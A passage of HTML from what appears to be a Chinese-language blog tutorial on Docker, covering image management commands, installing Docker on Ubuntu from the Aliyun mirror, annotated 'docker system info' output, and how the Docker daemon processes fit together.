                <span class="token string">"LowerDir"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/overlay2/7e01f99d0c11ed39e85b19c848a5593a5e9ebc65d339a266c07cd1f7bd7431ba/diff:/var/lib/docker/overlay2/d74f65dcbc4304207be8a4591b8c83f1d7faa4659da1612d0468e34f507902af/diff:/var/lib/docker/overlay2/ee3d6bfb887a97e99debff027624cc44f7e927852f10ad685c07468175b2f50b/diff:/var/lib/docker/overlay2/9589ebb2cd873d1a650ef2f9d540505edccbb13f838b13b660f1d49a060be769/diff:/var/lib/docker/overlay2/c81f555278e6da337860aebbe14978402627d46d4beb3ad5eaed34ec2b9264fe/diff"</span>,
                <span class="token string">"MergedDir"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/overlay2/efe3607d46ef55d39a59cf896b34e8e186d657969a48b121f89dca639f8541f4/merged"</span>,
                <span class="token string">"UpperDir"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/overlay2/efe3607d46ef55d39a59cf896b34e8e186d657969a48b121f89dca639f8541f4/diff"</span>,
                <span class="token string">"WorkDir"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/overlay2/efe3607d46ef55d39a59cf896b34e8e186d657969a48b121f89dca639f8541f4/work"</span>
            <span class="token punctuation">&#125;</span>,
            <span class="token string">"Name"</span><span class="token builtin class-name">:</span> <span class="token string">"overlay2"</span>
        <span class="token punctuation">&#125;</span>,
        <span class="token string">"RootFS"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"Type"</span><span class="token builtin class-name">:</span> <span class="token string">"layers"</span>,
            <span class="token string">"Layers"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f"</span>,
                <span class="token string">"sha256:e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8"</span>,
                <span class="token string">"sha256:b8d6e692a25e11b0d32c5c3dd544b71b1085ddc1fddad08e68cbd7fda7f70221"</span>,
                <span class="token string">"sha256:f1db227348d0a5e0b99b15a096d930d1a69db7474a1847acbc31f05e4ef8df8c"</span>,
                <span class="token string">"sha256:32ce5f6a5106cc637d09a98289782edf47c32cb082dc475dd47cbf19a4f866da"</span>,
                <span class="token string">"sha256:d874fd2bc83bb3322b566df739681fbd2248c58d3369cb25908d68e7ed6040a6"</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>,
        <span class="token string">"Metadata"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"LastTagTime"</span><span class="token builtin class-name">:</span> <span class="token string">"0001-01-01T00:00:00Z"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span></code></pre>

<h4 id="查看本地镜像-ls"><a href="#查看本地镜像-ls" class="headerlink" title="查看本地镜像  ls"></a>查看本地镜像 <code> ls</code></h4><p>等同于 <code>docker images</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker image ls --help</span>
<span class="token function">docker</span> image <span class="token function">ls</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token punctuation">[</span>REPOSITORY<span class="token punctuation">[</span>:TAG<span class="token punctuation">]</span><span class="token punctuation">]</span>

Options:
  -a, 	<span class="token parameter variable">--all</span>             	Show all images <span class="token punctuation">(</span>default hides intermediate images<span class="token punctuation">)</span>
  		<span class="token parameter variable">--digests</span>         	Show digests
  -f, 	<span class="token parameter variable">--filter</span> filter   	Filter output based on conditions provided
  		<span class="token parameter variable">--format</span> string   	Pretty-print images using a Go template
  		--no-trunc        	<span class="token comment"># 不截断输出,即展示完整的容器ID</span>
  -q, 	<span class="token parameter variable">--quiet</span>           	<span class="token comment"># 只展示容器ID</span>

REPOSITORY		<span class="token comment"># 镜像所属的仓库名称</span>
TAG				<span class="token comment"># 镜像版本号（标识符），默认为latest</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> image <span class="token function">ls</span>
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
nginx        latest    605c77e624dd   <span class="token number">11</span> months ago   141MB

$ <span class="token function">docker</span> image <span class="token function">ls</span> <span class="token parameter variable">-q</span>
605c77e624dd

$ <span class="token function">docker</span> image <span class="token function">ls</span> --no-trunc
REPOSITORY   TAG       IMAGE ID                                                                  CREATED         SIZE
nginx        latest    sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85   <span class="token number">11</span> months ago   141MB


IMAGE ID		<span class="token comment"># 镜像唯一ID标识,如果ID相同,说明是同一个镜像有多个名称</span></code></pre>

<p><strong>REPOSITORY 仓库：</strong></p>
<ul>
<li>由某特定的 docker 镜像的所有迭代版本组成的镜像仓库</li>
<li>一个 Registry 中可以存在多个 Repository</li>
<li>Repository 可分为“顶层仓库”和“用户仓库”</li>
<li>Repository 用户仓库名称一般格式为“用户名&#x2F;仓库名”</li>
<li>每个 Repository 仓库可以包含多个 Tag(标签)，每个标签对应一个镜像</li>
</ul>
<h4 id="镜像导出-save"><a href="#镜像导出-save" class="headerlink" title="镜像导出 save"></a>镜像导出 <code>save</code></h4><p>将本地镜像导出为一个文件(tar 格式)，然后复制到其他服务器，导入使用</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker help image save</span>
Usage:	<span class="token function">docker</span> image save <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> IMAGE <span class="token punctuation">[</span>IMAGE<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Options:
  -o, <span class="token parameter variable">--output</span> string   Write to a file, instead of STDOUT</code></pre>

<p>常见用法：以下两种用法等价</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> save <span class="token parameter variable">-o</span> /path/file.tar IMAGE1 IMAGE2 <span class="token punctuation">..</span>.
<span class="token function">docker</span> save IMAGE1 IMAGE2 <span class="token punctuation">..</span>. <span class="token operator">></span> /path/file.tar</code></pre>

<h4 id="镜像导入-load"><a href="#镜像导入-load" class="headerlink" title="镜像导入 load"></a>镜像导入 <code>load</code></h4><p><code>save</code> 导出的镜像 tar 文件，使用<code>load</code>导入</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker help image load</span>

Usage:	<span class="token function">docker</span> image load <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>

Options:
  -i, <span class="token parameter variable">--input</span> string   Read from <span class="token function">tar</span> archive file, instead of STDIN
  -q, <span class="token parameter variable">--quiet</span>          Suppress the load output</code></pre>

<p>常见用法：以下两种用法等价</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> load <span class="token parameter variable">-i</span> /data/myimages.tar
<span class="token function">docker</span> load <span class="token operator">&lt;</span> /data/myimages.tar</code></pre>

<h4 id="删除镜像-rm"><a href="#删除镜像-rm" class="headerlink" title="删除镜像 rm"></a>删除镜像 <code>rm</code></h4><p>删除本地镜像</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker help image rm</span>
Usage:	<span class="token function">docker</span> image <span class="token function">rm</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> IMAGE <span class="token punctuation">[</span>IMAGE<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Aliases:
  rm, rmi, remove

Options:
  -f, 	<span class="token parameter variable">--force</span>      		Force removal of the image		<span class="token comment"># 强制删除</span>
  		--no-prune   	   	Do not delete untagged parents</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">rmi</span><span class="token operator">=</span><span class="token string">'docker image ls -aq | xargs -n1 docker image rm'</span></code></pre>

<h4 id="镜像打标签-tag"><a href="#镜像打标签-tag" class="headerlink" title="镜像打标签 tag"></a>镜像打标签 <code>tag</code></h4><p>给镜像打标签，类似于起别名，但通常要遵守一定的命名规范，才可以上传到指定的仓库</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> image tag SOURCE_IMAGE<span class="token punctuation">[</span>:TAG<span class="token punctuation">]</span> TARGET_IMAGE<span class="token punctuation">[</span>:TAG<span class="token punctuation">]</span>

<span class="token comment"># TARGET_IMAGE[:TAG] 格式一般为</span>
<span class="token number">1</span>.仓库主机FQDN或IP<span class="token punctuation">[</span>:端口<span class="token punctuation">]</span>
<span class="token number">2</span>.项目名<span class="token punctuation">(</span>或用户名<span class="token punctuation">)</span>
<span class="token number">3</span>.image名字:版本		<span class="token comment"># docker tag alpine alpine:3.11</span></code></pre>

<p>tag 默认为 latest</p>
<p>先 tag 给镜像打标签，然后再 save 导出镜像，拷贝到其他机器，其他机器可以 load 导入</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/Docker/1.1.docker%E5%AE%89%E8%A3%85%E5%8F%8A%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/Docker/1.1.docker%E5%AE%89%E8%A3%85%E5%8F%8A%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">docker安装</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-08 11:27:09" itemprop="dateCreated datePublished" datetime="2021-01-08T11:27:09+08:00">2021-01-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/Docker/" itemprop="url" rel="index"><span itemprop="name">Docker</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="安装和删除方法"><a href="#安装和删除方法" class="headerlink" title="安装和删除方法"></a>安装和删除方法</h2><p>官方文档：<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/">https://docs.docker.com/engine/install/</a><br>ubuntu：<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a><br>centos：<a target="_blank" rel="noopener" href="https://docs.docker.com/install/linux/docker-ce/centos/">https://docs.docker.com/install/linux/docker-ce/centos/</a><br>阿里云文档：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/mirror/docker-ce">https://developer.aliyun.com/mirror/docker-ce</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ubuntuu</span>
$ <span class="token function">sudo</span> <span class="token function">apt</span> update
$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> <span class="token punctuation">\</span>
    apt-transport-https <span class="token punctuation">\</span>
    ca-certificates <span class="token punctuation">\</span>
    <span class="token function">curl</span> <span class="token punctuation">\</span>
    gnupg-agent <span class="token punctuation">\</span>
    software-properties-common
<span class="token comment">#$ curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -	# ubuntu22.04中废弃了apt-key命令</span>
$ <span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> gpg <span class="token parameter variable">--dearmor</span> <span class="token parameter variable">-o</span> /etc/apt/trusted.gpg.d/docker.gpg

$ <span class="token function">sudo</span> add-apt-repository <span class="token punctuation">\</span>
    <span class="token string">"deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \
    <span class="token variable"><span class="token variable">$(</span>lsb_release <span class="token parameter variable">-cs</span><span class="token variable">)</span></span> \
    stable"</span>
$ <span class="token function">sudo</span> <span class="token function">apt</span> update
$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> docker-ce

<span class="token comment"># 以上是直接安装最新版本，推荐安装时指定版本</span>
$ <span class="token function">apt-cache</span> madison docker-ce
$ <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> docker-ce<span class="token operator">=</span><span class="token operator">&lt;</span>VERSION_STRING<span class="token operator">></span></code></pre>

<p>二进制安装：<a target="_blank" rel="noopener" href="https://docs.docker.com/install/linux/docker-ce/binaries/">https://docs.docker.com/install/linux/docker-ce/binaries/</a><br><a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/docker-ce/linux/static/stable/x86_64/">https://mirrors.aliyun.com/docker-ce/linux/static/stable/x86_64/</a></p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>docker-ce 配置文件：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">/etc/docker/daemon.json</code></pre>

<p>docker registry 配置文件：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ubuntu，来自containerd.io软件包</span>
/etc/containerd/config.toml
<span class="token comment"># centos</span>
/etc/containers/registries.conf</code></pre>

<h2 id="docker-命令帮助"><a href="#docker-命令帮助" class="headerlink" title="docker 命令帮助"></a>docker 命令帮助</h2><p><a target="_blank" rel="noopener" href="https://docs.docker.com/reference/">https://docs.docker.com/reference/</a></p>
<p>新版 docker 命令采用结构化格式，虽然老版命令依旧可以使用，但是还是推荐结构化的使用命令，更加规范有效的使用。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> <span class="token builtin class-name">help</span>

Usage:  <span class="token function">docker</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> COMMAND

A self-sufficient runtime <span class="token keyword">for</span> containers

Options:
      <span class="token parameter variable">--config</span> string      Location of client config files <span class="token punctuation">(</span>default <span class="token string">"/root/.docker"</span><span class="token punctuation">)</span>
  -c, <span class="token parameter variable">--context</span> string     Name of the context to use to connect to the daemon <span class="token punctuation">(</span>overrides DOCKER_HOST <span class="token function">env</span> var and default context <span class="token builtin class-name">set</span>
                           with <span class="token string">"docker context use"</span><span class="token punctuation">)</span>
  -D, <span class="token parameter variable">--debug</span>              Enable debug mode
  -H, <span class="token parameter variable">--host</span> list          Daemon socket<span class="token punctuation">(</span>s<span class="token punctuation">)</span> to connect to
  -l, --log-level string   Set the logging level <span class="token punctuation">(</span><span class="token string">"debug"</span><span class="token operator">|</span><span class="token string">"info"</span><span class="token operator">|</span><span class="token string">"warn"</span><span class="token operator">|</span><span class="token string">"error"</span><span class="token operator">|</span><span class="token string">"fatal"</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>default <span class="token string">"info"</span><span class="token punctuation">)</span>
      <span class="token parameter variable">--tls</span>                Use TLS<span class="token punctuation">;</span> implied by <span class="token parameter variable">--tlsverify</span>
      <span class="token parameter variable">--tlscacert</span> string   Trust certs signed only by this CA <span class="token punctuation">(</span>default <span class="token string">"/root/.docker/ca.pem"</span><span class="token punctuation">)</span>
      <span class="token parameter variable">--tlscert</span> string     Path to TLS certificate <span class="token function">file</span> <span class="token punctuation">(</span>default <span class="token string">"/root/.docker/cert.pem"</span><span class="token punctuation">)</span>
      <span class="token parameter variable">--tlskey</span> string      Path to TLS key <span class="token function">file</span> <span class="token punctuation">(</span>default <span class="token string">"/root/.docker/key.pem"</span><span class="token punctuation">)</span>
      <span class="token parameter variable">--tlsverify</span>          Use TLS and verify the remote
  -v, <span class="token parameter variable">--version</span>            Print version information and quit

Management Commands:
  app*        Docker App <span class="token punctuation">(</span>Docker Inc., v0.9.1-beta3<span class="token punctuation">)</span>
  builder     Manage builds
  buildx*     Docker Buildx <span class="token punctuation">(</span>Docker Inc., v0.9.1-docker<span class="token punctuation">)</span>
  config      Manage Docker configs		<span class="token comment"># 管理docker配置</span>
  container   Manage containers			<span class="token comment"># 管理容器</span>
  context     Manage contexts
  image       Manage images				<span class="token comment"># 管理镜像</span>
  manifest    Manage Docker image manifests and manifest lists
  network     Manage networks			<span class="token comment"># 管理网络</span>
  <span class="token function">node</span>        Manage Swarm nodes		<span class="token comment"># 管理Swarm节点</span>
  plugin      Manage plugins			<span class="token comment"># 管理插件</span>
  scan*       Docker Scan <span class="token punctuation">(</span>Docker Inc., v0.21.0<span class="token punctuation">)</span>
  secret      Manage Docker secrets		<span class="token comment"># 管理docker安全</span>
  <span class="token function">service</span>     Manage services			<span class="token comment"># 管理服务</span>
  stack       Manage Docker stacks
  swarm       Manage Swarm				<span class="token comment"># 管理Swarm集群</span>
  system      Manage Docker				<span class="token comment"># 管理docker系统</span>
  trust       Manage trust on Docker images		<span class="token comment"># 管理镜像信任</span>
  volume      Manage volumes					<span class="token comment"># 管理卷</span>

Commands:
  attach      Attach <span class="token builtin class-name">local</span> standard input, output, and error streams to a running container
  build       Build an image from a Dockerfile
  commit      Create a new image from a container<span class="token string">'s changes
  cp          Copy files/folders between a container and the local filesystem
  create      Create a new container
  diff        Inspect changes to files or directories on a container'</span>s filesystem
  events      Get real <span class="token function">time</span> events from the server
  <span class="token builtin class-name">exec</span>        Run a <span class="token builtin class-name">command</span> <span class="token keyword">in</span> a running container
  <span class="token builtin class-name">export</span>      Export a container<span class="token string">'s filesystem as a tar archive
  history     Show the history of an image
  images      List images
  import      Import the contents from a tarball to create a filesystem image
  info        Display system-wide information
  inspect     Return low-level information on Docker objects
  kill        Kill one or more running containers
  load        Load an image from a tar archive or STDIN
  login       Log in to a Docker registry
  logout      Log out from a Docker registry
  logs        Fetch the logs of a container
  pause       Pause all processes within one or more containers
  port        List port mappings or a specific mapping for the container
  ps          List containers
  pull        Pull an image or a repository from a registry
  push        Push an image or a repository to a registry
  rename      Rename a container
  restart     Restart one or more containers
  rm          Remove one or more containers
  rmi         Remove one or more images
  run         Run a command in a new container
  save        Save one or more images to a tar archive (streamed to STDOUT by default)
  search      Search the Docker Hub for images
  start       Start one or more stopped containers
  stats       Display a live stream of container(s) resource usage statistics
  stop        Stop one or more running containers
  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE
  top         Display the running processes of a container
  unpause     Unpause all processes within one or more containers
  update      Update configuration of one or more containers
  version     Show the Docker version information
  wait        Block until one or more containers stop, then print their exit codes

Run '</span><span class="token function">docker</span> COMMAND --help' <span class="token keyword">for</span> <span class="token function">more</span> information on a command.

To get <span class="token function">more</span> <span class="token builtin class-name">help</span> with docker, check out our guides at https://docs.docker.com/go/guides/</code></pre>

<h2 id="docker-相关信息"><a href="#docker-相关信息" class="headerlink" title="docker 相关信息"></a>docker 相关信息</h2><pre class="language-bash" data-language="bash"><code class="language-bash">lujinkai@Z510:~$ <span class="token function">sudo</span> <span class="token function">docker</span> system info
Client:
 Debug Mode: <span class="token boolean">false</span>	<span class="token comment">#client 端是否开启 debug</span>

Server:
 Containers: <span class="token number">3</span>	<span class="token comment">#当前主机运行的容器总数</span>
  Running: <span class="token number">0</span>	<span class="token comment">#有几个容器是正在运行的</span>
  Paused: <span class="token number">0</span>		<span class="token comment">#有几个容器是暂停的</span>
  Stopped: <span class="token number">3</span>	<span class="token comment">#有几个容器是停止的</span>
 Images: <span class="token number">4</span>		<span class="token comment">#当前服务器的镜像数</span>
 Server Version: <span class="token number">19.03</span>.13	<span class="token comment">#服务端版本</span>
 Storage Driver: overlay2	<span class="token comment">#正在使用的存储引擎</span>
  Backing Filesystem: extfs	<span class="token comment">#后端文件系统,即服务器的磁盘文件系统</span>
  Supports d_type: <span class="token boolean">true</span>		<span class="token comment">#是否支持 d_type</span>
  Native Overlay Diff: <span class="token boolean">true</span>	<span class="token comment">#是否支持差异数据存储</span>
 Logging Driver: json-file	<span class="token comment">#日志类型</span>
 Cgroup Driver: cgroupfs	<span class="token comment">#Cgroups 类型</span>
 Plugins:					<span class="token comment">#插件</span>
  Volume: <span class="token builtin class-name">local</span>				<span class="token comment">#卷</span>
  Network: bridge <span class="token function">host</span> ipvlan macvlan null overlay	<span class="token comment"># overlay 跨主机通信</span>
  <span class="token comment">#日志类型</span>
  Log: awslogs fluentd gcplogs gelf journald json-file <span class="token builtin class-name">local</span> logentries splunk syslog
 Swarm: inactive	<span class="token comment">#是否支持 swarm</span>
 Runtimes: runc		<span class="token comment">#已安装的runtime</span>
 Default Runtime: runc	<span class="token comment">#默认使用的容器runtime</span>
 Init Binary: docker-init	<span class="token comment">#初始化容器的守护进程,即 pid 为 1 的进程</span>
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175	<span class="token comment">#版本</span>
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd	<span class="token comment">#runc 版本</span>
 init version: fec3683	<span class="token comment">#init 版本</span>
 Security Options:	<span class="token comment">#安全选项</span>
  apparmor	<span class="token comment">#安全模块,https://docs.docker.com/engine/security/apparmor/</span>
  seccomp	<span class="token comment">#安全计算模块,即制容器操作，https://docs.docker.com/engine/security/seccomp/</span>
   Profile: default		<span class="token comment">#默认的配置文件</span>
 Kernel Version: <span class="token number">5.4</span>.0-53-generic		<span class="token comment">#宿主机内核版本</span>
 Operating System: Ubuntu <span class="token number">20.04</span>.1 LTS	<span class="token comment">#宿主机操作系统</span>
 OSType: linux			<span class="token comment">#宿主机操作系统类型</span>
 Architecture: x86_64	<span class="token comment">#宿主机架构</span>
 CPUs: <span class="token number">4</span>	<span class="token comment">#宿主机 CPU 数量</span>
 Total Memory: <span class="token number">15</span>.56GiB		<span class="token comment">#宿主机总内存</span>
 Name: Z510		<span class="token comment">#宿主机 hostname</span>
 ID: 7FJX:7VKN:2YGG:VKRB:5KKA:DB7C:KNLC:UW2N:XH3E:EVEG:OSQJ:EEKV	<span class="token comment">#宿主机 ID</span>
 Docker Root Dir: /var/lib/docker	<span class="token comment">#宿主机关于docker数据的保存目录</span>
 Debug Mode: <span class="token boolean">false</span>		<span class="token comment">#server 端是否开启 debug</span>
 Registry: https://index.docker.io/v1/		<span class="token comment">#仓库路径</span>
 Labels:
 Experimental: <span class="token boolean">false</span>	<span class="token comment">#是否测试版</span>
 Insecure Registries:
  <span class="token number">127.0</span>.0.0/8		<span class="token comment">#非安全的镜像仓库</span>
 Registry Mirrors:
  https://3417nt4m.mirror.aliyuncs.com/		<span class="token comment">#镜像仓库</span>
 Live Restore Enabled: <span class="token boolean">false</span>	<span class="token comment">#是否开启活动重启 (重启docker-daemon 不关闭容器 )</span>

WARNING: No swap limit support	<span class="token comment">#系统警告信息 (没有开启 swap 资源限制 )</span></code></pre>

<p>解决上述 SWAP 报警提示：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># vim /etc/default/grub</span>
<span class="token punctuation">..</span>.
<span class="token assign-left variable">GRUB_CMDLINE_LINUX</span><span class="token operator">=</span><span class="token string">"net.ifnames=0 biosdevname=0 swapaccount=1"</span>	<span class="token comment">#修改此行</span>
<span class="token punctuation">..</span>.

<span class="token function">sudo</span> <span class="token function">update-grub</span>
<span class="token function">sudo</span> <span class="token function">reboot</span></code></pre>

<h2 id="docker0-网卡"><a href="#docker0-网卡" class="headerlink" title="docker0 网卡"></a>docker0 网卡</h2><p>在 docker 安装启动之后，默认会生成一个名称为 docker0 的网卡，默认 IP 地址为 172.17.0.1 的网卡</p>
<h2 id="docker-存储引擎"><a href="#docker-存储引擎" class="headerlink" title="docker 存储引擎"></a>docker 存储引擎</h2><p>docker 官方推荐首选存储引擎为 overlay2，需要磁盘分区支持 d-type 功能</p>
<h2 id="docker-服务进程"><a href="#docker-服务进程" class="headerlink" title="docker 服务进程"></a>docker 服务进程</h2><p>docker 相关的四个进程：</p>
<ul>
<li>dockerd：服务端程序，被 client 直接访问，父进程为宿主机的 systemd 守护进程</li>
<li>docker-proxy：每个进程 docker-proxy 实现对应一个需要网络通信的容器，管理宿主机和容器的之间端口映射，其父进程为 dockerd，如果容器不需要网络则无需启动</li>
<li>containerd：被 dockerd 进程调用以实现与 runc 交互</li>
<li>containerd-shim：真正运行容器的载体，每个容器对应一个 containerd-shim 进程，其父进程为 containerd</li>
</ul>
<h3 id="containerd-shim-命令"><a href="#containerd-shim-命令" class="headerlink" title="containerd-shim 命令"></a>containerd-shim 命令</h3><h3 id="容器的创建与管理过程"><a href="#容器的创建与管理过程" class="headerlink" title="容器的创建与管理过程"></a>容器的创建与管理过程</h3><p><img data-src="//img.to2b.cn/blog/ljk/1605701276549.png"></p>
<ol>
<li>dockerd 通过 grpc 和 containerd 模块通信，由 libcontainerd 负责，通信的 socket：&#x2F;run&#x2F;containerd&#x2F;containerd.sock</li>
<li>containerd 在 dockerd 启动时被启动，然后 containerd 启动 grpc 请求监听，containerd 处理请求，根据请求作出相应动作</li>
<li>run&#x2F;start&#x2F;exec 容器，containerd 拉起一个 container-shim，并进行相应的操作</li>
<li>container-shim 被拉起后，start&#x2F;exec&#x2F;create 拉起 runc 进程，通过 exit、control 文件和 containerd 通信，通过父子进程关系和 sigchld 监控容器中进程状态</li>
<li>在整个容器生命周期中，container 通过 epoll 监控容器文件、事件</li>
</ol>
<h3 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h3><p><img data-src="//img.to2b.cn/blog/lujinkai/1669884233046.png"></p>
<p>gPRC 是谷歌开发的一款高性能、开源和通用的 RPC 框架，支持众多语言客户端</p>
<h2 id="docker-服务管理"><a href="#docker-服务管理" class="headerlink" title="docker 服务管理"></a>docker 服务管理</h2><p>docker 服务基于 C&#x2F;S 架构，可以实现基于本地和远程方式进行管理</p>
<p>范例：docker 服务添加标签</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">vim</span> /lib/systemd/system/docker.service
<span class="token comment"># 修改如下行</span>
<span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/bin/dockerd <span class="token parameter variable">-H</span> fd:// <span class="token parameter variable">--containerd</span><span class="token operator">=</span>/run/containerd/containerd.sock <span class="token parameter variable">--label</span><span class="token operator">=</span><span class="token string">"name=docker1"</span>
<span class="token punctuation">..</span>.


$ <span class="token function">docker</span> info
<span class="token punctuation">..</span>.
Labels:
<span class="token assign-left variable">name</span><span class="token operator">=</span>docker1	<span class="token comment">#此处显示添加的标签</span>
<span class="token punctuation">..</span>.</code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/Docker/1.Docker%E4%BB%8B%E7%BB%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/Docker/1.Docker%E4%BB%8B%E7%BB%8D/" class="post-title-link" itemprop="url">docker介绍</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-08 11:26:43" itemprop="dateCreated datePublished" datetime="2021-01-08T11:26:43+08:00">2021-01-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
